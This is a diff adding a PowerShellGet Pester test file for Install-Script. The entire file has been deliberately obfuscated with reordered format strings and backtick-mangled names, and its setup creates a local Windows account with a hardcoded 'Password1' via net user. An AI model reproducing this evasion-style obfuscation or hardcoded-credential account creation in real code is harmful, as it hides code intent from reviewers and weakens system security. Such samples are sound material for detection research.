@@ -1,0 +1,1775 @@
+  $Z7YW =  [tyPe]("{1}{4}{2}{3}{0}"-f 'paTh','SYS','.i','o.','TEm');  $zenJk  =[TYpE]("{1}{4}{2}{3}{0}"-F 'nt','Sy','NvIRoNm','e','SteM.E'); sEt-VaRIablE  QLM ([TypE]("{3}{1}{2}{0}" -f'.guid','t','em','SYs')) ; 
+
+
+
+function sUi`TeSeT`Up {
+    &("{1}{2}{0}" -f'le','Import-M','odu') "$PSScriptRoot\PSGetTestUtils.psm1" -WarningAction ("{0}{2}{1}" -f'Silen','tinue','tlyCon')
+    &("{1}{2}{3}{0}"-f'e','Imp','o','rt-Modul') "$PSScriptRoot\Asserts.psm1" -WarningAction ("{2}{1}{4}{3}{0}" -f'inue','i','S','Cont','lently')
+
+    ${Scr`IPt:`IsWiNdoW`sOs} = (-not (&("{1}{0}{2}"-f 'l','Get-Variab','e') -Name ("{0}{1}{2}" -f'I','sWi','ndows') -ErrorAction ("{0}{1}"-f'Igno','re'))) -or ${ISw`in`DO`WS}
+    ${SCRI`Pt:`P`R`oGRamf`iLE`ss`cRiptsPaTh} = &("{3}{0}{6}{2}{5}{1}{4}" -f'A','s','lUsersScrip','Get-','Path','t','l')
+    ${s`cRi`PT:MYdoc`UMENT`SSCrIPtSP`AtH} = &("{3}{0}{4}{1}{5}{2}" -f'urrentUse','Scripts','h','Get-C','r','Pat')
+    ${s`C`Ri`pt`:`PsgEt`loCalappDA`TAPAth} = &("{0}{3}{6}{1}{7}{2}{5}{4}" -f'Get-','al','pData','PSGe','ath','P','tLoc','Ap')
+    ${ScrIPT:T`EmpP`A`Th} = &("{1}{3}{2}{0}"-f 'Path','Ge','emp','t-T')
+    &("{2}{0}{1}"-f'te','m','New-I') -Path ${ScRIPT`:M`y`D`oCumE`NT`ss`cript`S`paTh} -ItemType ("{1}{0}{2}"-f 'ector','Dir','y') -ErrorAction ("{2}{1}{0}{3}{4}" -f'tlyConti','n','Sile','nu','e') -WarningAction ("{0}{2}{1}{3}{4}"-f 'SilentlyCo','ti','n','n','ue')
+
+    
+    &("{4}{1}{2}{5}{3}{0}{6}"-f 'ri','ta','l','GetBina','Ins','l-Nu','es')
+
+    ${ScRI`pt`:`pSGET`mo`D`Ul`EiNfO} = &("{3}{0}{2}{4}{1}" -f 'mport','dule','-','I','Mo') ("{0}{1}{2}" -f'Powe','r','ShellGet') -Global -Force -Passthru
+    &("{1}{5}{2}{4}{0}{3}" -f 't','Impor','-Loca','a','lizedDa','t')  ("{3}{0}{4}{1}{2}{5}"-f 'c','z','edDat','script:Lo','ali','a') -filename ("{2}{1}{3}{4}{0}" -f 'urce.psd1','Get.R','PS','es','o') -BaseDirectory ${Scri`pT:PSGETmo`Du`l`ei`N`FO}."mOdU`lEB`ASE"
+
+    ${S`C`R`iPT:`moduLesOuRc`eS`FILEp`Ath} = &("{2}{1}{0}"-f 'in-Path','o','J') ${sC`Ri`Pt:psg`et`lO`CA`lapPData`PaTH} ("{1}{0}{2}{3}{4}" -f'SRe','P','pos','ito','ries.xml')
+    ${sCri`pt`:moDulEsOU`RCESb`AckUpf`il`E`PAth} = &("{1}{0}{2}"-f'oin','J','-Path') ${sC`Ri`PT`:`PsG`EtlOCA`LaPPDAtapath} "PSRepositories.xml_$(get-random)_backup"
+    if (&("{2}{1}{0}"-f't-Path','es','T') ${s`C`R`ipT:moDuLes`O`Ur`Cesf`iL`EPAtH}) {
+        &("{2}{0}{3}{1}"-f 'enam','m','R','e-Ite') ${S`cRIP`T:ModU`lesouRcEsfil`EP`ATh} ${sCRi`pt:mOd`UlE`SOurce`SBacKu`p`F`iLE`PATH} -Force
+    }
+
+    ${Glo`Bal:PSg`AlLE`RYS`oUrceUri} = ''
+    &("{7}{3}{5}{2}{8}{4}{1}{6}{0}"-f 'ils','ry','GetT','AndS','stGalle','et-PS','Deta','Get','e') -IsScriptSuite -SetPSGallery -PSGallerySourceUri ([REF]${GLOB`Al:psGAL`le`RYso`URCE`Uri})
+
+
+    &("{0}{4}{2}{3}{1}" -f'G','pt','t-Ins','talledScri','e') -Name ("{1}{5}{3}{4}{2}{0}" -f 'pt','Fab','rScri','-Se','rve','rikam') -ErrorAction ("{0}{3}{1}{2}{4}" -f'Sil','Con','tinu','ently','e') | &("{3}{2}{1}{0}"-f'ipt','cr','S','Uninstall-') -Force
+    &("{4}{3}{2}{1}{0}"-f 'cript','lledS','ta','ns','Get-I') -Name ("{1}{3}{0}{4}{2}"-f'entSc','Fabr','ipt','ikam-Cli','r') -ErrorAction ("{0}{2}{3}{1}" -f'Silentl','e','yCon','tinu') | &("{0}{1}{2}{3}{4}"-f 'Un','in','sta','ll-Scr','ipt') -Force
+
+    if (${SCR`i`pt:iSw`InDow`soS}) {
+        ${scrI`P`T:UsErN`Ame} = ("{1}{0}{2}" -f'Get','PS','User')
+        ${pA`sSw`oRD} = ("{0}{2}{1}" -f'Pa','word1','ss')
+        ${n`Ull} = &("{0}{1}" -f 'n','et') ("{1}{0}" -f'r','use') ${S`cRi`pt:uS`ERNa`mE} ${pAs`S`w`ord} ("{0}{1}" -f '/a','dd')
+        ${sEc`s`Tr} = &("{2}{1}{0}{4}{3}{5}{6}" -f'T','onvert','C','e','o-S','cureStri','ng') ${p`A`SSwoRD} -AsPlainText -Force
+        ${SCR`IPt:CrE`De`NtI`AL} = &("{2}{0}{1}" -f'ew-obj','ect','n') -typename ("{9}{6}{0}{1}{4}{5}{7}{2}{10}{3}{8}" -f 'm.','Mana','Automation.PS','enti','g','e','te','ment.','al','Sys','Cred') -argumentlist ${sc`RiPt:`USeRnAmE}, ${sE`cs`Tr}
+    }
+
+    ${sc`RipT:`AsSeRtti`MEOuT`Ms} = 20000
+    ${sc`RI`pt:UNtrusTE`dREp`OSOURcelocAt`I`On} = ("{12}{3}{4}{7}{11}{9}{0}{8}{10}{6}{1}{5}{2}"-f '/powe','est-i','/v2/','//powersh','e','tems/api','t','ll.myget','rsh','org/F','ellget-','.','https:')
+    ${ScRi`PT:`Un`TRuS`T`E`dRePOP`UblisHlOc`ATI`on} = ("{7}{1}{18}{4}{11}{17}{10}{2}{13}{6}{15}{16}{14}{0}{5}{3}{9}{8}{12}"-f 'i','po','.o','v2','she','/','he','https://','g','/packa','t','ll.my','e','rg/F/powers','ap','llget-tes','t-items/','ge','wer')
+
+    
+    ${Scrip`T`:tem`psAvEPAtH} = &("{1}{2}{0}" -f 'h','Join-','Pat') -Path ${ScRIpt:`T`E`m`PpatH} -ChildPath "PSGet_$(Get-Random)"
+    ${N`ULl} = &("{0}{1}"-f 'Ne','w-Item') -Path ${Scr`IPt`:TemP`s`AV`EPA`TH} -ItemType ("{1}{2}{0}"-f'y','Direct','or') -Force
+
+    ${S`CrIpt:ADD`EDAlLu`se`R`SI`Ns`TaLlp`Ath} = &("{2}{5}{4}{0}{7}{6}{3}{1}" -f'ab','lLocation','Set-','l','Vari','PATH','a','leForScriptsInst') -Scope ("{0}{1}" -f 'AllUse','rs')
+    ${S`CRI`P`T:a`D`deDcUrRe`NTUse`Ri`NS`TALLPa`Th} = &("{1}{0}{3}{6}{2}{5}{8}{7}{4}"-f '-P','Set','ript','ATHVariableFo','on','sInst','rSc','ti','allLoca') -Scope ("{2}{1}{3}{0}"-f 'ntUser','urr','C','e')
+
+    ${s`C`RIPT:`psgeTSettiNgS`FilE`p`ATh} = &("{2}{0}{1}" -f'n-P','ath','Joi') ${ScRipT`:psg`eTlOca`La`P`pda`TaP`A`Th} ("{4}{0}{1}{3}{2}" -f'Sh','ellGe','ml','tSettings.x','Power')
+    ${ScriPT:`p`S`getsetTi`NGsbA`cK`UPfil`ePAth} = &("{0}{1}"-f'Jo','in-Path') ${S`Cr`ipt:PsgET`LoCALaPP`DAta`paTH} "PowerShellGetSettings.xml_$(get-random)_backup"
+    if (&("{2}{3}{0}{1}" -f'-Pat','h','Tes','t') ${S`CrI`PT:pSg`ET`S`EtTIn`gs`F`iLEpaTH}) {
+        &("{2}{1}{3}{0}" -f'-Item','n','Re','ame') ${sCript:psgEtSEt`T`i`N`gs`Fil`epAtH} ${Sc`R`iPT:ps`GeTsEt`TingSbAckUP`F`ilEpath} -Force
+    }
+
+    ${sC`R`i`PT`:E`NVIrON`MENTvaR`iab`LeTArgET} = @{ ("{1}{0}" -f's','Proces') = 0; ("{1}{0}"-f 'r','Use') = 1; ("{1}{2}{0}"-f'hine','M','ac') = 2 }
+}
+
+function s`U`itEcL`Eanup {
+    if (&("{1}{0}{2}"-f 'at','Test-P','h') ${ScRi`p`T:m`oDULESo`U`RceS`B`Ac`KUpf`ILepatH}) {
+        &("{0}{2}{1}"-f'Mov','-Item','e') ${SCrIPT:mod`ULESoU`R`C`ESBAcK`Up`FIl`EpaTh} ${ScR`i`pt:`Mod`U`l`ESOU`RCESFiL`ePath} -Force
+    }
+    else {
+        &("{2}{1}{0}"-f'm','eIte','Remov') ${scR`Ip`T:m`oD`UlEsourCEsFiLEpath}
+    }
+
+    
+    ${N`UlL} = &("{2}{5}{4}{0}{1}{3}{6}"-f'rt-','Package','I','Provid','po','m','er') -Name ("{2}{1}{0}" -f 't','ellGe','PowerSh') -Force
+
+    if (${SCR`ipt:isWIN`Dows`Os}) {
+        
+        &("{1}{0}"-f'et','n') ("{0}{1}" -f'u','ser') ${sCRiP`T:USe`R`N`AMe} ("{1}{0}{2}"-f 'dele','/','te') | &("{1}{0}" -f'ut-Null','O')
+        
+        
+        if (&("{2}{0}{3}{1}" -f'et-Co','d','G','mman') -Name ("{1}{2}{0}"-f 't','Get','-WmiObjec') -ErrorAction ("{0}{1}{3}{2}{4}" -f 'S','ile','nu','ntlyConti','e')) {
+            ${u`sE`RPrO`FIle} = (&("{1}{2}{0}{3}" -f'ec','Get-Wm','iObj','t') -Class ("{4}{1}{3}{2}{5}{0}" -f'file','n32_Us','r','erP','Wi','o') | &("{1}{2}{0}{3}" -f'ere-Obje','W','h','ct') { ${_}."LoCalPa`Th" -match ${scrIPT:U`S`e`Rn`AmE} })
+            if (${USEr`PR`OFILE}) {
+                &("{2}{0}{1}"-f 'mov','eItem','Re') ${uSeRPR`Of`i`lE}."LOc`AL`PaTH"
+            }
+        }
+    }
+
+    &("{1}{2}{0}"-f'em','RemoveI','t') ${s`CrIPT:te`mp`SAVe`PatH}
+
+    if (${Script:AdD`ED`A`LlusErS`In`StALLpA`TH}) {
+        &("{7}{6}{2}{1}{0}{3}{4}{5}"-f'allL','riptsInst','HVariableForSc','ocat','i','on','set-PAT','Re') -Scope ("{0}{2}{1}" -f 'Al','s','lUser')
+    }
+
+    if (${scriPT:`A`DDE`dcUrr`EN`TUsERi`Ns`T`AL`LpatH}) {
+        &("{1}{2}{7}{4}{3}{6}{0}{5}" -f 'tallLocati','Reset-P','ATHVari','cripts','S','on','Ins','ableFor') -Scope ("{1}{2}{0}{3}" -f'tUs','C','urren','er')
+    }
+
+    if (&("{1}{2}{0}"-f'h','Test','-Pat') ${S`crIpT:P`SGeTsE`TT`in`Gs`BAc`Ku`PF`iLePATH}) {
+        &("{0}{1}" -f'Mo','ve-Item') ${Sc`R`IpT:`PsGet`Set`Tin`GSB`Ac`k`UpfiL`EpaTH} ${sc`R`iPt:pSgET`sett`InGsfilE`PAth} -Force
+    }
+    else {
+        &("{0}{2}{1}" -f 'Re','em','moveIt') ${sCripT:PSGE`Ts`ett`ing`sfi`lE`Pa`Th}
+    }
+}
+
+&("{0}{2}{1}"-f 'Desc','be','ri') ("{1}{3}{6}{8}{7}{0}{4}{9}{5}{2}"-f'i','P','s','owerShell.PSGet','ptTe','t','.I','allScr','nst','s') -Tags 'BVT', ("{0}{2}{1}"-f'Inn','op','erLo') {
+
+    &("{2}{0}{3}{1}" -f'o','l','Bef','reAl') {
+        &("{1}{2}{0}"-f'tup','SuiteS','e')
+    }
+
+    &("{1}{0}" -f 'erAll','Aft') {
+        &("{2}{3}{1}{0}" -f'p','eanu','SuiteC','l')
+    }
+
+    &("{0}{1}" -f'Aft','erEach') {
+        &("{0}{3}{2}{1}" -f'Get-In','ipt','Scr','stalled') -Name ("{2}{4}{3}{1}{0}"-f '-Script','m','F','rika','ab') -ErrorAction ("{3}{4}{0}{1}{2}"-f'tlyC','o','ntinue','Sil','en') | &("{2}{3}{1}{4}{0}{5}" -f 'll-Scrip','t','Uni','ns','a','t') -Force
+        &("{0}{1}{2}{3}" -f 'Get-Inst','al','led','Script') -Name ("{0}{4}{5}{2}{1}{3}"-f 'Fabr','ip','Scr','t','ika','m-Server') -ErrorAction ("{1}{0}{2}{3}" -f'lyC','Silent','o','ntinue') | &("{2}{1}{5}{4}{0}{3}"-f 'cr','t','Unins','ipt','l-S','al') -Force
+        &("{0}{1}{2}{5}{3}{4}"-f 'Get-Inst','a','l','cri','pt','ledS') -Name ("{3}{5}{2}{4}{1}{0}" -f'ipt','ntScr','kam-Cli','Fab','e','ri') -ErrorAction ("{3}{2}{0}{1}" -f 'Conti','nue','ently','Sil') | &("{0}{1}{3}{4}{2}" -f 'Uninstal','l','t','-Scr','ip') -Force
+    }
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{10}{0}{6}{1}{4}{8}{7}{2}{3}{5}{9}" -f'nst','ll-S','kam-Server','Scri','cr','pt should be sil','a','t Fabri','ip','ent','I') {
+        ${ReS`Ult} = &("{2}{3}{1}{0}"-f 't','ip','Install','-Scr') -Name ("{1}{3}{2}{5}{4}{0}"-f 'rScript','F','ik','abr','Serve','am-')
+        ${R`e`suLt} | &("{0}{1}" -f 'Shou','ld') -BeNullOrEmpty
+    }
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{1}{6}{12}{13}{18}{9}{8}{14}{17}{15}{11}{0}{4}{7}{16}{3}{5}{2}{10}"-f 'a','In','n out','re','ssThru','tur','stall',' sho','erve','rikam-S','put',' -P','-Scrip','t','rSc','ipt','uld ','r',' Fab') {
+        ${re`s`Ult} = &("{2}{0}{3}{1}"-f 'all-','ript','Inst','Sc') -Name ("{4}{2}{1}{3}{5}{0}" -f 'pt','Se','brikam-','rv','Fa','erScri') -PassThru
+        ${R`ESU`LT} | &("{0}{2}{1}" -f 'S','d','houl') -Not -BeNullOrEmpty
+    }
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{0}{7}{4}{2}{8}{6}{1}{3}{5}"-f'In','a','Scr','rd','l','s','ptWithRangeWildC','stal','i') {
+        &("{6}{7}{3}{1}{4}{0}{2}{5}"-f'Err','lyQualif','o','sertFul','ied','rIdEquals','A','s') -scriptblock { &("{2}{3}{4}{0}{1}" -f 'Scri','pt','I','nstall','-') ("{4}{7}{8}{3}{1}{0}{2}{5}{6}" -f'erS',']','cr','r[a-z','F','?p','t','ab[rR]ika','m?Se'), ("{2}{0}{1}" -f 'mpN','ame','Te') } `
+            -expectedFullyQualifiedErrorId ("{4}{5}{2}{10}{6}{8}{1}{9}{0}{7}{3}" -f's','cardCh','S','cript','Nam','e','uldNotContain',',Install-S','Wild','aracter','ho')
+    }
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{3}{0}{5}{2}{1}{4}{6}"-f'ns','abl','l','I','eScri','tallNotAvai','ptWithWildCard') {
+        &("{1}{2}{3}{0}"-f 't','Inst','all-Scr','ip') -Name ("{2}{5}{4}{1}{3}{0}" -f'riptW','v','Fa','erSc','r','brikam-Se') -ErrorAction ("{1}{2}{0}"-f 'ue','Silen','tlyContin')
+
+        &("{0}{4}{6}{3}{1}{5}{2}"-f'As','llyQua','uals','u','ser','lifiedErrorIdEq','tF') -scriptblock { &("{1}{3}{0}{4}{2}" -f's','Get-I','cript','n','talledS') ("{2}{1}{0}{4}{3}" -f 'kam-ServerSc','bri','Fa','ipt','r') } `
+            -expectedFullyQualifiedErrorId ("{1}{5}{10}{13}{0}{14}{2}{12}{9}{8}{3}{4}{6}{7}{11}" -f'w','NoMatchFound,Micro','hell.Pack','nt','.Cmdl','s','et','s.','ageme','n','oft','GetPackage','ageMa','.Po','erS')
+    }
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{4}{0}{1}{2}{3}"-f 'ult','ip','leScr','ipts','InstallM') {
+        &("{0}{1}{2}"-f'Install-S','c','ript') ("{2}{1}{6}{3}{4}{5}{0}"-f'pt','brikam-C','Fa','entS','c','ri','li'), ("{4}{0}{2}{3}{1}" -f 'ikam','ipt','-Serve','rScr','Fabr')
+        ${R`eS} = &("{3}{5}{0}{2}{4}{1}" -f 't-InstalledS','ipt','c','G','r','e') ("{1}{4}{2}{3}{0}" -f 't','Fabrikam-Clien','r','ip','tSc'), ("{4}{0}{3}{2}{5}{1}"-f'abrikam-Se','ript','e','rv','F','rSc')
+        &("{1}{2}{0}"-f'rt','As','se') (${r`eS}."co`UNT" -eq 2) ("{6}{4}{5}{8}{3}{7}{9}{12}{10}{0}{1}{11}{2}" -f'p','l','ould not fail','wi','ns','tall','I','th ','-Script ','m','lti','e names sh','u')
+    }
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{4}{2}{1}{0}{5}{3}"-f'lS','al','nst','leScript','I','ing') {
+        ${SCr`IpTNA`ME} = ("{6}{1}{5}{0}{2}{4}{3}"-f 'am-S','br','er','erScript','v','ik','Fa')
+
+        ${fINd`scrIP`T`OuTpUT} = &("{2}{1}{0}" -f 'pt','d-Scri','Fin') ${SC`RiPTn`A`ME}
+        ${DA`TetimeBe`FOr`E`iNSt`ALL} = &("{1}{2}{0}"-f 'e','Get-D','at')
+
+        &("{0}{3}{2}{1}" -f'Insta','cript','S','ll-') ${Scrip`TN`A`ME} -scope ("{0}{2}{3}{1}" -f'Cu','ser','rr','entU')
+        ${R`eS} = &("{4}{2}{1}{3}{0}{5}" -f 'dScrip','Inst','-','alle','Get','t') ${Sc`RipT`NAMe}
+
+        &("{0}{1}{2}"-f'As','s','ertEquals') ${r`es}."NA`me" ${SCR`ipTna`Me} ('Insta'+'ll-Scr'+'i'+'pt '+'fail'+'ed '+'t'+'o '+'in'+'s'+'tall '+"$scriptName, "+"$res")
+        &("{1}{0}" -f'ssert','A') (${R`eS}."V`Er`SiON" -ge '2.5') ('In'+'val'+'id '+'Ver'+'sion '+'v'+'alu'+'e '+'in'+' '+'Get'+'-Install'+'edScr'+'ipt'+' '+'meta'+'da'+'ta, '+"$res")
+        &("{3}{2}{1}{0}"-f 's','ual','Eq','Assert') ${R`Es}."t`YpE" ("{2}{0}{1}"-f 'p','t','Scri') ('I'+'nvali'+'d '+'T'+'ype '+'value'+' '+'in'+' '+'Get-I'+'ns'+'talledScrip'+'t '+'metad'+'ata'+', '+"$res")
+        &("{0}{1}{2}" -f'Asser','tEqu','als') ${r`Es}."dEscr`IPt`Ion" ${fIndsCr`IpT`Ou`TPut}."DEscr`Ipt`i`ON" ('Inva'+'l'+'id '+'Descrip'+'tio'+'n'+' '+'val'+'ue '+'i'+'n '+'Get-Install'+'ed'+'S'+'c'+'ri'+'pt '+'m'+'etadat'+'a, '+"$res")
+        &("{1}{2}{0}" -f 'uals','A','ssertEq') ${R`Es}."aut`Hor" ${f`i`NDs`CrIPTO`UT`PUt}."aUT`Hor" ('Invali'+'d '+'Autho'+'r'+' '+'va'+'lue '+'in'+' '+'Ge'+'t-'+'InstalledScript'+' '+'metada'+'t'+'a, '+"$res")
+        &("{2}{1}{3}{0}"-f 's','a','AssertEqu','l') ${r`es}."cOM`PaNyN`A`mE" ${F`iN`DSCriP`ToUT`P`Ut}."comp`A`NYnAMe" ('Inv'+'ali'+'d '+'C'+'om'+'panyName '+'valu'+'e '+'in'+' '+'Get-I'+'n'+'sta'+'ll'+'ed'+'Script '+'meta'+'d'+'a'+'ta, '+"$res")
+        &("{3}{0}{1}{2}" -f's','sertEqu','als','A') ${R`es}."COP`yR`IGHT" ${fINd`SC`R`iP`TOUTpUT}."cO`pY`RiGhT" ('In'+'val'+'id '+'Copyr'+'ight'+' '+'v'+'alue '+'in'+' '+'Get-Ins'+'tall'+'edScr'+'ipt '+'m'+'e'+'tadata, '+"$res")
+        &("{0}{2}{3}{1}" -f 'Asse','Equals','r','t') ${r`eS}."pUbLi`Sh`EddaTE" ${fiN`dS`CRIP`TOUtPUt}."pubL`ISH`EddAte" ('Inva'+'li'+'d '+'Publishe'+'dDate'+' '+'valu'+'e '+'in'+' '+'G'+'e'+'t-Install'+'edScript '+'m'+'etada'+'ta, '+"$res")
+        &("{3}{0}{2}{1}"-f'r','quals','tE','Asse') ${r`eS}."L`IC`enSe`URI" ${F`INDSc`R`iP`T`ouTPUt}."l`icenseU`RI" ('I'+'nval'+'id '+'Lice'+'nse'+'Uri '+'val'+'u'+'e '+'in'+' '+'Get'+'-InstalledSc'+'ri'+'pt'+' '+'m'+'etadata'+', '+"$res")
+        &("{1}{0}{2}"-f'ual','AssertEq','s') ${R`es}."PROJ`e`CtURi" ${F`ind`S`cRiP`TOut`puT}."p`Ro`Je`CturI" ('Inv'+'alid'+' '+'P'+'roje'+'ctUr'+'i '+'value'+' '+'in'+' '+'G'+'et-In'+'stalled'+'Scrip'+'t '+'m'+'etad'+'ata'+', '+"$res")
+        &("{2}{1}{0}"-f 'uals','ertEq','Ass') ${r`es}."ic`O`NurI" ${Fin`dSc`RIptouTp`UT}."icOnU`RI" ('I'+'n'+'valid '+'IconU'+'ri '+'v'+'alue '+'in'+' '+'Ge'+'t'+'-I'+'nstalle'+'dScri'+'p'+'t '+'m'+'etada'+'ta, '+"$res")
+        &("{0}{2}{1}" -f'AssertE','s','qual') ${R`ES}."RELea`se`N`OTeS" ${fI`NDsc`RIp`T`OU`TPUT}."RELeASE`N`OTES" ('In'+'valid '+'Release'+'N'+'otes '+'v'+'alue '+'in'+' '+'G'+'e'+'t-Install'+'edS'+'cript '+'met'+'ad'+'a'+'ta, '+"$res")
+        &("{3}{0}{2}{1}"-f'rtEqu','s','al','Asse') ${r`es}."rE`Po`sITORY" ${f`IN`dsc`RIPtoUTPUT}."Re`Pos`iTO`RY" ('I'+'nva'+'lid '+'Rep'+'osit'+'ory '+'va'+'lue'+' '+'i'+'n '+'Ge'+'t-In'+'stal'+'ledS'+'cr'+'ipt'+' '+'metadata'+','+' '+"$res")
+        &("{3}{0}{2}{1}" -f'sse','als','rtEqu','A') ${R`ES}."RE`P`oSiTOrYSO`U`RCeloCATIOn" ${F`In`D`ScRipto`UtpUt}."REpOsi`ToR`Y`soURCE`loCa`TIoN" ('I'+'nvali'+'d '+'R'+'epo'+'s'+'itoryS'+'our'+'ce'+'Location '+'v'+'alu'+'e '+'in'+' '+'Get-In'+'s'+'talled'+'Script '+'metadat'+'a,'+' '+"$res")
+        &("{3}{2}{0}{1}"-f 'l','s','Equa','Assert') ${R`ES}."p`AcKa`gE`MaNaG`eMENTprOv`iDer" ${f`INDsc`Ri`pt`OuTPuT}."PA`C`K`AgEmana`g`Em`ENtpROVIDEr" ('I'+'nvali'+'d '+'Pack'+'a'+'geManag'+'e'+'mentProvider '+'valu'+'e'+' '+'i'+'n '+'Get'+'-I'+'nstalled'+'Scri'+'p'+'t '+'metadata'+','+' '+"$res")
+        &("{2}{0}{1}" -f'tE','quals','Asser') ${R`eS}."INStAlle`Dl`O`caTION" ${ScRiPt:mYd`O`CumENtssCrIPT`sPA`Th} ('In'+'v'+'alid '+'In'+'s'+'talled'+'L'+'oca'+'tion '+'valu'+'e'+' '+'in'+' '+'G'+'et-Ins'+'talle'+'d'+'Script '+'me'+'tad'+'ata,'+' '+"$res")
+        &("{1}{0}{2}"-f'al','AssertEqu','s') ${R`es}."poWERshE`l`lG`eTFoRmaT`V`e`RsiON" ${F`In`dS`CRipToutPUt}."powE`RSH`ELl`geTfORm`A`T`VErSIon" ('I'+'nval'+'id '+'Po'+'werShe'+'l'+'lG'+'etFormatV'+'e'+'rsi'+'on'+' '+'val'+'ue '+'i'+'n '+'Ge'+'t'+'-Insta'+'lledS'+'cript'+' '+'m'+'etad'+'ata, '+"$res")
+
+        &("{0}{2}{1}"-f'Ass','ll','ertNotNu') ${r`eS}."ins`TalLeD`d`ATE" ('G'+'et-I'+'nstal'+'ledScr'+'ip'+'t '+'resul'+'t'+'s '+'a'+'re '+'no'+'t '+'expec'+'t'+'ed, '+'I'+'nstalledD'+'ate'+' '+'sh'+'o'+'uld '+'no'+'t '+'b'+'e '+'nul'+'l, '+"$res")
+        &("{1}{0}"-f'sert','As') (${r`Es}."InsTAllE`dd`AtE".("{2}{1}{0}" -f'conds','dSe','Ad').Invoke(1) -ge ${DatEtIM`eb`eFoR`E`INS`Tall}) "Get-InstalledScript results are not expected, InstalledDate $($res.InstalledDate.Ticks) should be after $($DateTimeBeforeInstall.Ticks) "
+        &("{1}{2}{0}"-f 'l','AssertNu','l') ${r`eS}."uPD`Ated`DAte" ('G'+'et'+'-'+'Insta'+'lle'+'dS'+'cript '+'r'+'es'+'ults '+'are'+' '+'n'+'ot '+'expe'+'cted'+', '+'Updat'+'eDat'+'e '+'sho'+'uld'+' '+'be'+' '+'n'+'ull, '+"$res")
+
+        ${F`I`ND`SCRI`ptOUTPut}."Ta`gs" | &("{1}{2}{0}{3}"-f '-Obj','ForEac','h','ect') {
+            &("{0}{1}" -f'Ass','ert') (${r`Es}."ta`gS" -contains ${_}) "Invalid Tags value, missing $_ in Tags from Get-InstalledScript metadata, $($res.Tags) "
+        }
+    }
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{6}{8}{5}{2}{1}{7}{3}{4}{0}"-f'Version','A','ll','ptWi','thMin','ta','In','Scri','s') {
+        ${scRIP`TN`AMe} = ("{3}{4}{0}{2}{1}{5}"-f 'kam','ri','-ServerSc','Fa','bri','pt')
+        ${ve`R`SiON} = '1.0'
+        &("{0}{2}{1}"-f'Inst','Script','all-') ${S`criPT`NaME} -MinimumVersion ${veR`si`On}
+        ${R`es} = &("{0}{1}{4}{3}{5}{2}"-f 'Get-I','ns','ipt','lle','ta','dScr') ${sCRi`P`Tna`Me} -MinimumVersion ${ver`SioN}
+        &("{1}{2}{0}" -f 'ls','Asse','rtEqua') ${r`ES}."Na`mE" ${sCRI`PTn`A`me}
+        &("{0}{1}{2}" -f'As','s','ert') (${R`eS}."vE`R`SION" -ge [Version]${vErsi`On}) ("{2}{5}{0}{4}{3}{6}{7}{1}"-f'f','ith Version','Install-S','t','ailed ','cript ','o instal','l w')
+    }
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{1}{5}{3}{4}{2}{6}{0}{7}{8}" -f'qVe','I','r','a','llASc','nst','iptWithRe','rs','ion') {
+        ${s`CriPTn`Ame} = ("{3}{2}{1}{0}" -f 'erScript','erv','abrikam-S','F')
+        ${v`ErsI`On} = '1.5'
+        &("{0}{2}{3}{1}"-f'I','ipt','nstal','l-Scr') ${SCRi`Pt`NaME} -RequiredVersion ${veR`si`oN}
+        ${R`Es} = &("{3}{2}{0}{1}"-f'Sc','ript','-Installed','Get') ${s`C`RipT`NAME} -RequiredVersion ${v`ERSiON}
+        &("{1}{0}{2}" -f 'ssert','A','Equals') ${R`eS}."Na`Me" ${sCrIp`T`N`AmE}
+        &("{3}{2}{1}{0}"-f 's','ual','q','AssertE') ${r`ES}."vErs`I`ON" ${VEr`s`IOn} ("{2}{8}{7}{0}{4}{1}{3}{5}{6}{10}{9}"-f'ipt','tal','Install-S','l wi',' failed to ins','th Requi','redV','r','c','n','ersio')
+    }
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{3}{4}{8}{0}{2}{5}{7}{6}{1}"-f 'ul','d','dNotF','Ins','t','ailIfReq','lreadyInstalle','VersionA','allScriptSho') {
+        &("{2}{1}{0}{3}"-f'Scrip','all-','Inst','t') ("{2}{0}{3}{1}" -f 'abri','m-ServerScript','F','ka') -RequiredVersion 2.0
+        ${m`y`ERRor} = ${nU`ll}
+        &("{2}{4}{1}{0}{3}" -f'rip','Sc','Install','t','-') ("{2}{0}{3}{1}{4}" -f'brik','S','Fa','am-','erverScript') -RequiredVersion 2.0 -ErrorVariable ("{0}{1}" -f'MyErro','r')
+        &("{0}{1}" -f 'A','ssert') ((-not ${My`Er`RoR}) -or -not (${mYe`R`RoR} | &('?') { -not ((${_}."ME`ssage" -match ("{2}{1}{4}{6}{3}{5}{0}"-f'ception','pU','Sto','nd','p','sEx','streamComma')) -or (${_}."ME`SSaGe" -eq ("{0}{1}{2}" -f'System ','er','ror.'))) })) ('The'+'re'+' '+'shoul'+'d '+'not'+' '+'be'+' '+'any'+' '+'er'+'ror '+'fro'+'m '+'s'+'eco'+'nd '+'i'+'nsta'+'ll '+'w'+'ith '+'require'+'d,'+' '+"$MyError")
+    } `
+        -Skip:$(${P`scuLt`URe} -ne ("{0}{1}"-f'en-','US'))
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{9}{8}{4}{2}{5}{7}{3}{0}{6}{1}"-f'adyInstal','d','fM','Alre','NotFailI','inVersio','le','n','iptShould','InstallScr') {
+        &("{2}{3}{1}{4}{0}" -f 't','all','I','nst','-Scrip') ("{1}{0}{2}{3}" -f 'brikam-S','Fa','erverScri','pt') -RequiredVersion 2.5
+        ${myE`RROR} = ${NU`lL}
+        &("{0}{3}{2}{1}" -f'I','-Script','ll','nsta') ("{6}{1}{0}{3}{5}{4}{2}"-f'm-','rika','Script','Ser','er','v','Fab') -MinimumVersion 2.0 -ErrorVariable ("{1}{0}"-f 'ror','MyEr')
